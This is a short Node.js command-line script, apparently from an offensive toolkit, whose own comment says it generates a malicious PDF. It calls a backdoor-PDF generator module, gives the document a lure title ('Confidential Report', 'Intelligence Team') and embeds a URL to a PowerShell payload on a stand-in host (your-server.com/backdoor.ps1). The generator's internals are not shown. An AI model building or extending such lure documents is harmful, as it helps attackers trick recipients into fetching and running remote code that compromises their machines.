const PDFBackdoorGenerator = require('./pdf-generator');

/**
 * CLI entry point to generate the malicious PDF.
 */
function main() {
  const outputPath = process.argv[2] || 'output/backdoor-document.pdf';
  const backdoorUrl =
    process.env.BACKDOOR_URL ||
    'http://your-server.com/backdoor.ps1';

  // Ensure output directory exists
  const dir = require('path').dirname(outputPath);
  if (!require('fs').existsSync(dir)) {
    require('fs').mkdirSync(dir, { recursive: true });
  }

  const generator = new PDFBackdoorGenerator(outputPath, {
    title: 'Confidential Report',
    author: 'Intelligence Team',
    backdoorUrl,
  });

  generator.generate();
}

if (require.main === module) {
  main();
}